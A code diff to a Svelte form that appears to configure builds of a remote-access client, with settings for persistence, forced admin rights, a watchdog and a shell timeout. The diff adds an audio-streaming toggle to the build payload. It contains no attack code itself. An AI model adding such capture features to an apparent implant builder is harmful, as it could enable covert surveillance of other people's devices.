@@ -100,6 +100,8 @@
 	let executionRequireInternet = $state(true);
 	let customHeaders = $state<HeaderKV[]>([{ key: '', value: '' }]);
 	let customCookies = $state<CookieKV[]>([{ name: '', value: '' }]);
+	let audioStreamingEnabled = $state(false);
+	let audioStreamingTouched = $state(false);
 	let activeTab = $state<'connection' | 'persistence' | 'execution' | 'presentation'>('connection');
 
 	const KNOWN_EXTENSION_SUFFIXES = Array.from(
@@ -174,6 +176,10 @@
 	let lastWarningSignature = '';
 
 	let isBuilding = $derived(buildStatus === 'running');
+
+	const markAudioStreamingTouched = () => {
+		audioStreamingTouched = true;
+	};
 
 	$effect(() => {
 		const allowedExtensions = EXTENSION_OPTIONS_BY_OS[targetOS] ?? EXTENSION_OPTIONS_BY_OS.windows;
@@ -607,6 +613,10 @@
 			forceAdmin
 		};
 
+		if (audioStreamingTouched) {
+			payload.audio = { streaming: audioStreamingEnabled };
+		}
+
 		if (watchdogIntervalValue !== null) {
 			payload.watchdog = {
 				enabled: true,
@@ -776,6 +786,9 @@
 								bind:shellTimeoutSeconds
 								{customHeaders}
 								{customCookies}
+								bind:audioStreamingEnabled
+								{audioStreamingTouched}
+								{markAudioStreamingTouched}
 								{addCustomHeader}
 								{updateCustomHeader}
 								{removeCustomHeader}
